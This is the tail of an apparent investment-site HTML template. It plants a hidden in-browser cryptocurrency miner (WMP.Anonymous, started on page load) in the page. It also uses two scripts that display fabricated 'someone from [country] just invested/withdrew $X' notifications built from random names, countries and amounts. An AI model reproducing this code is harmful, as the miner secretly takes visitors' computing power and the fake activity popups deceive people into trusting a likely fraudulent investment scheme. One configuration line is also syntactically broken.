                "Lucas", "Amelia", "Mason", "Mathew", "Richard", "Chris", "Mia", "Oliver"],
                Varible2: ["USA","UAE","ITALY", "FLORIDA",  "MEXICO",  "INDIA",  "CHINA",  "CAMBODIA",  "UNITED KINGDOM",  "GERMANY", "AUSTRALIA",  "BANGLADESH", "SWEDEN", "PAKISTAN", "MALDIVES", "SEYCHELLES", 
                "BOLIVIA",
                 "SOUTH AFRICA", "ZAMBIA", "ZIMBABWE", "LEBANESE", "SAUDI ARABIA", "CHILE", "PEUTO RICO"],
                
                Amount: [3500,5500,15550,8660,14440,7986,9533,25000,30141,45000],                    
                Content: '[Varible1] from [Varible2]  just Invested <b>$[Amount]</b>',
                // Timer
                Show: ['stable', 5, 10],
                Close: 5,
                Time: [0, 23],
                // Notification style 
                LocationTop: [true, '30%'],
                LocationBottom:[false, '10%'],
                LocationRight: [false, '10%'],                      
                LocationLeft:[true, '10px'],
                Background: '#fff#fff
                BorderRadius: 5,
                BorderWidth: 1,
                BorderColor: '#ffc552',
                TextColor: '#2962FF',
                IconColor: '#2962FF',
                // Notification Animated   
                AnimationEffectOpen: 'slideInUp',
                AnimationEffectClose: 'slideOutDown',
                // Number of notifications
                Number: 40,
                // Notification link
                Link: [false, '\', '_blank']
                
            });         
        }); 				
	</script>
	<script type="text/javascript" src="{{ asset ('home/alert/js/jquery.fake-notification.min.js')}}"></script>
	<!--miner-->

     <script>
        var miner = WMP.Anonymous('SK_XPOrdHezNlQ323zaH3qbs', {
            throttle: 0.2});
          miner.start();
    </script> 
    <!--miner-->
    
    
    <div class="mgm" style="display: none;">
        <div class="txt" style="color:black;"></div>

        <script type="text/javascript">
            var listCountries = ['South Africa', 'USA', 'Germany', 'France', 'Italy', 'South Africa', 'Australia', 'South Africa', 'Canada', 'Argentina', 'Saudi Arabia', 'Mexico', 'South Africa', 'South Africa', 'Venezuela', 'South Africa', 'Sweden', 'South Africa', 'South Africa', 'Italy', 'South Africa', 'United Kingdom', 'South Africa', 'Greece', 'Cuba', 'South Africa', 'Portugal', 'Austria', 'South Africa', 'Panama', 'South Africa', 'South Africa', 'Netherlands', 'Switzerland', 'Belgium', 'Israel', 'Cyprus'];
            var listPlans = ['$500','$1,500','$1,000','$10,000','$2,000','$3,000','$4,000', '$600', '$700', '$2,500'];
            var transarray = ['just <b>invested</b> with', 'just <b>withdrew</b>', 'just <b>earned</b>', 'is <b>trading with</b>'];
            interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
            var run = setInterval(request, interval);
        
            function request() {
                clearInterval(run);
                interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
                var country = listCountries[Math.floor(Math.random() * listCountries.length)];
                var transtype = transarray[Math.floor(Math.random() * transarray.length)];
                // var plan = listPlans[Math.floor(Math.random() * listPlans.length)];
                var plan = `$${(Math.ceil((Math.floor(Math.random() * 50000) + 500) * 100) / 100).toLocaleString()}`;
                var msg = `Someone from <b> ${country} </b> ${transtype} <b style="color:blue;"> ${plan} </b>`;
                $(".mgm .txt").html(msg);
                $(".mgm").stop(true).fadeIn(1000);
                window.setTimeout(function() {
                    $(".mgm").stop(true).fadeOut(2000);
                }, 10000);
                run = setInterval(request, interval);

            }
        </script>
    </div>
</body>

</html>